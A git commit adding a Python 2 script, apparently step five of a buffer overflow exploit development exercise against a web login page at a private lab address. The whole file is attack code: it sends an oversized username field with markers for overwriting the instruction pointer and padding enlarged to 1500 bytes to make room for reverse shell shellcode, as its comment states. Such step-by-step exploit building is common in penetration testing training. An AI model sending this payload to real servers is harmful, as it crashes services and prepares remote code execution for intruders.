00ec944dbb85f9645bbe594187bc1fc8ce08b95e
tobor <rosborne@osbornepro.com>
2020-05-04 14:45:56 -0600

    Create 5.attempt-extend-buffer-length.py

---
+++ 5.attempt-extend-buffer-length.py
@@ -0,0 +1,42 @@
+#!/usr/bin/env python                                                                                                                                                                                     
+# ReverseShell payloads typically require 350 to 400 bytes of space
+#
+# Attempt to increase the buffer by extending the buffer length value from 800 to 1500 to create more shellcode space
+import socket                                                                                                                                                                                             
+
+
+
+try:
+    print "\nSending evil buffer."
+
+    filler = "A" * 780
+    eip = "B" * 4
+    offset = "C" * 16
+    buffer = "D" * (1500 -len(filler) - len(eip) - len(offset))
+
+    inputBuffer = filler + eip + offset + buffer
+
+    content = "username=" + inputBuffer + "&password=A"
+        
+    buffer = "POST /login HTTP/1.1\r\n"
+    buffer += "Host: 192.168.172.10\r\n"
+    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
+    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
+    buffer += "Referer: http://192.168.172.10/login\r\n"
+    buffer += "Connection: close\r\n"
+    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
+    buffer += "Content-Length: "+str(len(content))+"\r\n"
+    buffer += "\r\n"
+        
+    buffer += content
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+    s.connect(("192.168.172.10", 80))
+    s.send(buffer)
+    s.close
+
+    print "Done!\n"
+except:
+    print "Could not connect"
